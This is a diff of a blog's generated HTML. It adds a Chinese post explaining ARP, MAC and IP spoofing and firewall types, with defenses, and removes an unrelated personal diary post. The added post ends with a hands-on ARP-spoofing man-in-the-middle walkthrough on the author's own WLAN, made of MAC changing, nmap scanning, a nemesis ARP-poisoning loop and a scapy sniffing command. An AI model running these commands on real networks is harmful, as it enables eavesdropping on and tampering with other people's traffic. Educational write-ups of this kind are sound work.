@@ -201,11 +201,215 @@
 
     
     
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/security/2014/02/26/spoofing/" itemprop="url">
+                  网络上的欺骗
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            发表于
+            <time itemprop="dateCreated" datetime="2014-02-26T00:00:00+08:00" content="2014-02-26">
+              2014-02-26
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp; 分类于
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/security/" itemprop="url" rel="index">
+                    <span itemprop="name">security</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/security/2014/02/26/spoofing/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="security/2014/02/26/spoofing/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+            
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body">
+
       
       
 
       
-    
+        
+          <span itemprop="articleBody">
+            
+              <p>首先，我们来被维基百科科普一下。然后试着执行一次中间人攻击。</p>
+<h1 id="理论基础">理论基础</h1><ul>
+<li><p>理解计算机网络分层架构。</p>
+</li>
+<li><p>习惯于主动使用搜索引擎寻找知识</p>
+</li>
+</ul>
+<p>以下内容来自维基百科</p>
+<h1 id="Arp_Spoofing">Arp Spoofing</h1><p>是一种攻击者在局域网上发送伪造的ARP消息的技术。通常是为了将另一个主机的IP地址关联到攻击者的MAC地址上。使那个主机的IP地址的流量定向到攻击者那里。</p>
+<p>ARP欺骗使攻击者截取本地局域网(LAN)上的数据帧，更改流量或者阻止流量。通常作为其它攻击方式比如拒绝服务攻击(DOS)，中间人攻击(MITM)或者会话劫持的开始。</p>
+<p>攻击局限在使用ARP协议的局域网上。</p>
+<p>局域网通信需要把网络层的IP地址转换成数据链路层的MAC地址<br>来在数据链路层传输。当知道一个主机的IP地址后，就需要通过一个广播来获取其MAC地址(ARP request)。这个主机响应(ARP reply)中包含这个IP的MAC地址。</p>
+<p>ARP协议没有状态，主机会自动缓存任何它们收到的ARP reply，无论是否它们请求过。即使没有过期的ARP缓存也会被新ARP响应覆盖。主机无法认证包的来源。</p>
+<p>通常，一次ARP攻击可能来自被侵害的机器或者直接是攻击者的主机。通常，攻击的目标是将攻击者的MAC地址关联到目标机器的IP地址，于是意味着发送到目标的流量就被送到攻击者的那里。攻击者可以：</p>
+<ul>
+<li>截取数据，然后原封不动转发给目标。(窃听)</li>
+<li>更改数据内容再转发给目标(MITM)</li>
+<li>通过丢弃所有或部分包对目标发起DOS攻击</li>
+</ul>
+<p>防御措施有：</p>
+<ul>
+<li>静态ARP表。</li>
+<li>一些软件通过某种形式的认证或交叉检查ARP响应的方式。DHCP服务器、独立主机、Ethernet交换机或其它网络设备都能有这种功能。比如多IP关联到一个MAC地址可能就预示着ARP欺骗。</li>
+<li>操作系统反应不一。Linux忽略任何不请自来的响应，但使用其它机器的可见请求来更新缓存。Solaris只在超时后更新缓存条目。Windows中，可以在<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters, ArpCachelife, ArpCacheMinReferencelife, ArpUseEtherSNAP, ArpTRSingleRoute, ArpAlwaysSourceRoute, ArpRetryCount</code>配置。</li>
+<li>主机防御。可能拒绝任何和缓存中MAC地址不同的应答更新，可能接受不同的但会探测之前的MAC地址是否还在。这些是基于已有的缓存中MAC地址是合法的基础上。<a href="一般通过dhcp服务器分配ip地址的大概就没什么问题。不过要是伪造dhcp服务器……啧啧……">^4</a></li>
+<li>被动探测。探测网络上的ARP请求和响应建立一个IP-MAC数据库</li>
+<li>DHCP服务器在分配IP后建立和维护对应的列表供网关使用。</li>
+</ul>
+<h1 id="Mac_Spoofing">Mac Spoofing</h1><p>是一种更改一个网络设备上接口的MAC(Media Access Control)地址的技术。MAC地址硬编码到网卡(NetWork Interface Controller)中无法更改，然而，有办法让操作系统相信网卡使用了用户指定的MAC地址。通常这更改了一个电脑的身份，然而相当简单。</p>
+<p>通常为了绕过服务器或路由器的访问控制列表，或者隐藏一台电脑或者冒充其它网络设备。看情况有时候合法有时候非法。</p>
+<ul>
+<li>为了在使用绑定MAC的ISP上使用新硬件或多个硬件。不过攻击者也能使用该技术。</li>
+<li>为了满足某些绑定MAC地址的软件要求</li>
+<li>身份隐藏以保护隐私。Wi-Fi连接MAC地址并不加密。因此monitor模式下网卡很容易搜集MAC地址。为了不被追踪可以使用MAC欺骗，然而攻击者可以用此技术冒充认证用户实行非法活动，并且难以探测。</li>
+</ul>
+<p>MAC欺骗的主机通常可以收到信息(有些特别安全交换机配置可以阻止这种包的传输)<a href="我拿自己手机试了下，大概这种特安全的地方很少吧。">^2</a>，然而，MAC地址伪造局限在局部广播域。<a href="[这里解释了为啥是在局域网内](http://stackoverflow.com/questions/10633753/nmap-not-retrieving-mac-address-and-vendor)">^3</a></p>
+<h1 id="IP_Spoofing">IP Spoofing</h1><p>是在IP协议包中伪造源地址的一种行为。其一是为了隐藏伪造者的身份，一是为了假扮成其它机器。</p>
+<p>攻击者通过更改IP包头源地址段，使之好像来源于其它机器。收到伪造包的机器就向错误的机器返回包。通常攻击者不在乎返回的包，或者他们可以可靠地探测响应。</p>
+<p>特定情况下可能攻击者可以看到或把数据包重定向到他自己的机器。这在本地局域网或本地无线局域网上常常发生。</p>
+<p>IP欺骗常用来进行DOS攻击，因为包来自不同地址，它让过滤变得不易。这让基于IP的防御不再有效。Backscatter是一种基于无效地址包的统计技术，然而更复杂的攻击还能避免无效的地址。</p>
+<p>IP欺骗也被用来绕过基于IP的认证。虽然这种方法会一次更改上千的包使之在攻击远端系统时实施非常困难，但在受信任的内网机器之间却很有效</p>
+<p>IP欺骗有时候也用作网站性能测试。</p>
+<p>易受IP欺骗的服务有：</p>
+<ul>
+<li>RPC</li>
+<li>任何基于IP的认证</li>
+<li>X window系统</li>
+<li>R(emote)系列服务比如rlogin，rsh</li>
+</ul>
+<h3 id="防御方式">防御方式</h3><ul>
+<li>包过滤。网关对出口或者入口包进行IP地址过滤，比如urpf(unicast Reverse Path Forwarding)。</li>
+<li>设计不是基于IP的网络协议和服务</li>
+<li>一些上层协议提供一些抵御。比如TCP使用序号来和远端机器通信来确保到达的包是已经建立连接的一部分。因攻击者通常看不到任何回应包，必须猜测序号来劫持连接。一些较老的系统或网络设备的TCP序号可以被预测。</li>
+</ul>
+<h1 id="Email_Spoofing">Email Spoofing</h1><p>以后再看，其实某次我们内网搭建的git服务器给我邮箱发了邮件并且收到时就想到了这个。</p>
+<h1 id="URL_Spoofing">URL Spoofing</h1><p>以后再说吧，想起了乌云上那篇猥琐流URL hacking。</p>
+<h1 id="FireWall">FireWall</h1><p>从发展史来看，防火墙的发展分为三代：</p>
+<ol>
+<li><p>包过滤。这一代防火墙仅仅对单个的包进行过滤。如果发现匹配的规则则丢弃(悄悄丢包)或者拒绝(返回错误)这个包。通常这些规则是包源地址、目的地址、协议、和比如针对TCP和UDP的端口。它没有关于连接的任何信息，是无状态的。</p>
+<p> 该代防火墙主要工作在下三层并稍微偷看下传输层的源和目的地址及端口。</p>
+</li>
+<li><p>有状态的过滤。不仅有第一代防火墙的功能，还工作到OSI第四层传输层上，会把<code>连接状态</code>作为一个评价标准。它会保留直到接受足够的包来决定它的连接状态。它记录所有经过的连接并决定是否一个包是新连接的开始或是已存在连接的一部分或者不是。</p>
+</li>
+<li><p>应用级防火墙<a href="SDN么这是？">^1</a>。这种防火墙工作在应用层。它能够理解上层协议，所以，可以去探测是否一个非法的协议在试图通过合法的端口穿越防火墙。传说中的下一代防火墙(NGFW)就是扩展和深化应用层栈的检查。</p>
+</li>
+</ol>
+<p>防火墙可以根据通信被截取的位置和被追踪的状态分类：</p>
+<ul>
+<li><p>网络层或包过滤<br> 主要工作在相对底层的TCP/IP层，靠规则过滤。有两种：</p>
+<ul>
+<li>有状态：存储当前连接阶段，源目的地址端口。若一个包不属于已经存在的连接，通过新连接的规则评价它。如果一个包属于已知的连接，则按所在连接处理方式处理</li>
+<li>无状态。需要更少内存、更快。适于处理无连接的协议。然而不能基于通信状态做出复杂决定。<br>一个例子就是iptables</li>
+</ul>
+</li>
+<li><p>应用层防火墙：通过套接字截取进程间通信，使用各种规则过滤。无法抵御底层的漏洞挖掘，正在被一种强制访问控制(MAC)应用防火墙取代，即沙盒。</p>
+</li>
+<li><p>代理：无论是专用的硬件或者软件，通过以应用的方式响应输入的包起作用。代理服务器是一个网络到另一个特定网络应用的网关，代表网络中的用户来行事。代理服务器使内网和外网隔离更彻底，但攻击者也可以通过使用一台机器当作代理攻击内部网络。</p>
+</li>
+<li><p>NAT——网络地址转换：防火墙通常有这些功能，防火墙后的机器通常拥有私有IP地址。本来用来减缓ipv4地址不够用的危机的措施，却意外成为一种反网络侦查的重要防御手段。</p>
+</li>
+</ul>
+<h1 id="Rogue_DHCP">Rogue DHCP</h1><p>伪造DHCP服务器，暂略。</p>
+<h1 id="DNS系列">DNS系列</h1><p>放到DNS里来讲</p>
+<hr>
+<p>下面，尝试一次中间人攻击，我是在WLAN内打开自己手机和笔记本。</p>
+<p>0.0 mac spoofing</p>
+<pre><code>~ ⮀ sudo ip link <span class="built_in">set</span> eth0 down
+~ ⮀ sudo ip link <span class="built_in">set</span> dev eth0 address <span class="number">38</span>:AA:<span class="number">3</span>C:E6:FE:<span class="number">69</span>
+~ ⮀ ip link <span class="built_in">set</span> eth0 up
+</code></pre><p>0.1 prepare</p>
+<pre><code>~ ⮀ ifconfig wlan0 promisc
+~ ⮀ echo <span class="number">1</span> &gt; /<span class="keyword">proc</span>/sys/net/ipv4/ip_forward
+</code></pre><ol>
+<li><p>find target machine</p>
+<p> ~ ⮀ sudo nmap -sS 192.168.1.0/24</p>
+</li>
+<li><p>arps it</p>
+</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"></span><br><span class="line">sudo nemesis arp -v -r <span class="operator">-d</span> wlan0 -S <span class="number">192.168</span>.<span class="number">1.102</span> -D <span class="number">192.168</span>.<span class="number">1.1</span> -h E8:<span class="number">39</span>:DF:<span class="number">08</span>:F4:FB -m EC:<span class="number">88</span>:<span class="number">8</span>F:B4:D6:<span class="number">68</span> -H  E8:<span class="number">39</span>:DF:<span class="number">08</span>:F4:FB -M EC:<span class="number">88</span>:<span class="number">8</span>F:B4:D6:<span class="number">68</span></span><br><span class="line"></span><br><span class="line">sudo nemesis arp -v -r <span class="operator">-d</span> wlan0 -S <span class="number">192.168</span>.<span class="number">1.1</span> -D <span class="number">192.168</span>.<span class="number">1.102</span> -h E8:<span class="number">39</span>:DF:<span class="number">08</span>:F4:FB -m <span class="number">68</span>:<span class="number">5</span>D:<span class="number">43</span>:<span class="number">2</span>E:AA:<span class="number">59</span> -H  E8:<span class="number">39</span>:DF:<span class="number">08</span>:F4:FB -M <span class="number">68</span>:<span class="number">5</span>D:<span class="number">43</span>:<span class="number">2</span>E:AA:<span class="number">59</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<ol>
+<li><p>listen it</p>
+<p> pkts = sniff(filter=”tcp and host 192.168.1.102”,iface=”wlan0”, prn=lambda x: sprintf(“{IP:%IP.src% -&gt; %IP.dst%\n}{Raw:%Raw.load%\n}”))</p>
+</li>
+<li><p>check it</p>
+</li>
+</ol>
+<h2 id="Footnotes">Footnotes</h2>
+            
+          </span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
 
     
       
@@ -2508,151 +2712,6 @@ fail:
 
 
     
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/life/2013/10/31/feelings-up-and-down/" itemprop="url">
-                  Feelings Up and Down
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            发表于
-            <time itemprop="dateCreated" datetime="2013-10-31T00:00:00+08:00" content="2013-10-31">
-              2013-10-31
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp; 分类于
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/life/" itemprop="url" rel="index">
-                    <span itemprop="name">life</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/life/2013/10/31/feelings-up-and-down/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2013/10/31/feelings-up-and-down/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-            
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody">
-            
-              <p>坐在电脑前，无所事事的浏览网页。打了一晚上dota imba，虐了一晚上电脑。</p>
-<p>然而对情绪丝毫没有作用。</p>
-<p>低落的时候做什么都无聊，</p>
-<p>和谁聊都觉得别人懒得理</p>
-<p>虽然显然不是这样。</p>
-<p>人真不是永远能情绪高昂啊。</p>
-<p>什么都无心再去学，无心再去折腾。</p>
-<p>忽然回想起当初在考研时那么热切地看可汗学院的统计学、概率论，</p>
-<p>上课时不是准备考研而是全身心的看data analysis with open source tools，</p>
-<p>晚上不去自习在计算机上实践代码。</p>
-<p>那份对数学的热情是虚无的么？</p>
-<p>不好好准备考研</p>
-<p>在寝室翻译arch linux wiki，</p>
-<p>翻译并尝试scipy lecture notes</p>
-<p>不好好准备复试</p>
-<p>非要拿着K&amp;R来实践来看并看得欲仙欲死</p>
-<p>一天到晚有些其它的想法</p>
-<p>在吃饭时、睡觉时、在操场上一个人散步时，</p>
-<p>想着代码怎么写，怎么实现自己的效果。</p>
-<p>几个小时一动不动地思考、审视、调试</p>
-<p>那份意欲无所不能的geek情怀是虚无的么？</p>
-<p>考完研想终于可以尽情折腾了</p>
-<p>忘记毕业季其它同学都在干什么了</p>
-<p>我一门心思一腔热血都花在计算机上</p>
-<p>把Professional Assembly Language里代码敲了一遍，只是因为觉得汇编好玩</p>
-<p>把hacking the art of exploitation完整的实现了一遍，因为觉得太有意思了</p>
-<p>在网上查阅收藏了无数网页、论文、教程，只因为觉得写shellcode很好玩</p>
-<p>折腾虚拟机，用metasploit尝试来尝试去乐在其中。</p>
-<p>当初那份hacking的乐趣也是虚无的么？</p>
-<p>再往前，折腾一大堆发行版对着漆黑的屏幕乐在其中的记忆、因为看到漂亮的网站折腾自己的博客的执着</p>
-<p>它们都曾经存在吗？</p>
-<p>我想，博客依然在这里，它明明昭示着我曾经是谁。</p>
-<p>它却不曾述说过我为何变化。</p>
-<p>它明明浓缩着我的热情、爱与欣喜，</p>
-<p>却不曾提及过我热情的幻化与失意伤心。</p>
-<p>它记录一路折腾的点点滴滴，我曾追求的方向</p>
-<p>然而，我却不打算在这里解释为何它停在这里。</p>
-<p>没有理由，只有选择。</p>
-<p>那份爱、激情的记忆是永恒的，</p>
-<p>在心中最宝贵的地方尘封。</p>
-<p>那段我所选择的青春。</p>
-<p>晚安，世界。</p>
-<p>ps:竟然是在vim中写这篇文章，还这么娴熟的使用快捷键，把小伙伴们惊呆了。<br>过去的岁月留下了深刻的烙印，仍然习惯地用着gentoo，开着火狐，wine着qq，用着gmail，<br>真是。。。唉。。。</p>
-
-            
-          </span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
 
   </section>
 
@@ -2699,7 +2758,7 @@ fail:
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">178</span>
+              <span class="site-state-item-count">179</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
